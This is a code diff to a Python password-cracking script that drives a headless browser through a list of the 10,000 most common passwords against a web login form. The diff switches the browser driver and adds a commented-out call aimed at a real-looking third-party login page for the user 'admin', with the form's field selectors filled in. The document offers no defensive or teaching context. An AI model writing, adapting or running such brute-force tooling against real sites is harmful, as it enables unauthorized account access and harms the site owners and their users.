@@ -17,7 +17,7 @@ pass_wordlist = os.path.join(project_root, "db", "10k-most-common.txt")
 
 
 def crack(url, username, user_sel, pass_sel, pass_list):
-    chrome_options = webdriver.ChromeOptions()
+    chrome_options = webdriver.FirefoxOptions()
     chrome_options.add_argument("--disable-popup-blocking")
     chrome_options.add_argument("--disable-extensions")
     chrome_options.add_argument("--headless")
@@ -75,5 +75,9 @@ def crack(url, username, user_sel, pass_sel, pass_list):
         print(f"\n\t{bad} Password list not found!\n\tPlease provide a valid password list")
 
 
+
+
+
 # Example usage
-crack("https://example.com", "example_user", "username_selector", "password_selector", pass_wordlist)
+# if __name__ == "__main__":
+#     crack("https://fcci.com.pk/fcci_demo/login.php","admin",'body > div > div > div > form > table > tbody > tr:nth-child(3) > td > input','body > div > div > div > form > table > tbody > tr:nth-child(5) > td > input',pass_wordlist)
